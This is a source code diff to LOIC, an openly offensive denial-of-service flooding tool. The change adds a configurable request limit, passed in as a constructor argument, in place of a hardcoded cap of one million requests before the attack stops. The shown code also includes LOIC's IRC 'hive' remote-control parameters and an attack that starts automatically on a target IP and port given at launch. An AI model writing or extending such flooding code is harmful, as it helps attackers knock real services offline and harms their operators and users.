@@ -27,6 +27,7 @@ namespace LOIC
 		private bool bIsHidden = false, bResp, intShowStats;
 		private string sMethod, sData, sSubsite, sTargetHost = "", sTargetIP = "";
 		private int iPort, iThreads, iDelay, iTimeout, iSockspThread;
+		private int iLimits;
 		private Protocol protocol;
 		private IrcClient irc;
 		private Thread irclisten;
@@ -43,7 +44,7 @@ namespace LOIC
 		/// <param name="ircserver">The irc server.</param>
 		/// <param name="ircport">The irc port.</param>
 		/// <param name="ircchannel">The irc channel.</param>
-		public frmMain(bool hive, bool hide, string ircserver, string ircport, string ircchannel, string targetIP, string targetPort, string protocol)
+		public frmMain(bool hive, bool hide, string ircserver, string ircport, string ircchannel, string targetIP, string targetPort, string protocol, string limits)
 		{
 			InitializeComponent();
 
@@ -82,6 +83,7 @@ namespace LOIC
 			disableHive.Checked |= !hive;
 			txtTargetIP.Text = targetIP;
 			txtPort.Text = targetPort;
+			this.iLimits = Int32.Parse(limits);
 			cbMethod.SelectedIndex = Int32.Parse(protocol);
 			LockOnIP(true);
 			Attack(false, true, true);
@@ -904,7 +906,7 @@ namespace LOIC
 						iDownloaded += c.Downloaded;
 						iRequested += c.Requested;
 						iFailed += c.Failed;
-						if(iRequested >= 1000000){
+						if(iRequested >= this.iLimits){
 							Attack(false, false, true);
 							Application.Exit();
 						}
